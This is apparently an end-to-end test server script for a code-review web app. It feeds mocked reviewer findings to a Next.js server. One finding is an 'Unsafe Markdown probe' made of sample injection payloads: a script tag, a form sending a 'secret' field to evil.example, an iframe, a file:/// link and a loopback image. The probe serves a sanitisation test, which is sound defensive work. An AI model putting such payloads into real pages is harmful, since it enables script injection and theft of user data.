import { formatFinding } from "@/src/server/finding-format";
import type { ReviewerFinding } from "@/src/shared/types";
import { createServer } from "node:http";
import next from "next";
import { installRuntimeForTests } from "@/src/server/runtime";
import { AppError } from "@/src/server/errors";
import { configureMr, createRuntimeHarness } from "../helpers/runtime";

const host = "127.0.0.1";
const port = 3210;
const origin = `http://${host}:${port}`;
process.env.REVIEWX_ORIGIN = origin;

const harness = await createRuntimeHarness();
configureMr(harness, "101", "1", "Security-sensitive parser update");
configureMr(harness, "101", "2", "Queue worker tests");
configureMr(harness, "101", "3", "Required context unavailable");
harness.reviewer.delayMs = 1800;
harness.reviewer.results.set("1", {
  findings: [
    {
      severity: "major",
      confidence: 35,
      verificationSummary: "已核对调用方与变更代码。",
      evidence: [{ side: "source", path: "src/parser.ts", startLine: 1, endLine: 1 }],
      body: [
        "### 🟠 Major: Unsafe Markdown probe",
        "",
        "The visible text is safe.",
        "",
        "<script>window.__reviewxInjected = true</script>",
        "",
        "<form action=\"https://evil.example\"><input name=\"secret\"></form>",
        "",
        "<iframe src=\"https://evil.example\"></iframe>",
        "",
        "[Local file](file:///C:/Windows/win.ini)",
        "![Loopback image](http://127.0.0.1:65535/private.png)",
        "![Public image](https://example.com/public.png)",
        "[Public documentation](https://example.com/docs)",
      ].join("\n"),
    },
    { severity: "suggestion", body: "### 🟢 Suggestion: Add a regression test\n\nKeep the parser behavior covered.",
      confidence: 0, verificationSummary: "已核对相关测试。", evidence: [{ side: "source", path: "src/parser.ts", startLine: 1, endLine: 1 }] },
  ].map(item => formatFinding({ ...(item as ReviewerFinding), title: "检视意见", description: item.body, locations: [{ evidenceIndex: 0, symbol: "parser" }], impact: "指定输入下解析行为可能异常。", solution: "待确认输入契约后调整。", prevention: "补充边界输入测试。" })),
});
harness.reviewer.results.set("2", { findings: [] });
harness.reviewer.failures.set("3", new AppError({ code: "REVIEW_INCOMPLETE", message: "检视未完成。", reason: "必要调用方未取得。",
  impact: "本次不生成可处理意见或 PASS。", nextStep: "补齐上下文后重新检视。", technical: "Verification round limit reached." }));
installRuntimeForTests(harness.runtime);

const application = next({ dev: process.env.REVIEWX_E2E_PRODUCTION !== "1", dir: process.cwd(), hostname: host, port });
await application.prepare();
const handler = application.getRequestHandler();
const server = createServer((request, response) => {
  if (request.headers.host !== `${host}:${port}`) {
    response.statusCode = 421;
    response.end("Invalid Host");
    return;
  }
  void handler(request, response);
});
await new Promise<void>((resolve, reject) => {
  server.once("error", reject);
  server.listen(port, host, resolve);
});

let stopping = false;
async function shutdown() {
  if (stopping) return;
  stopping = true;
  await harness.cleanup();
  await new Promise<void>((resolve) => server.close(() => resolve()));
}
process.once("SIGINT", () => void shutdown());
process.once("SIGTERM", () => void shutdown());
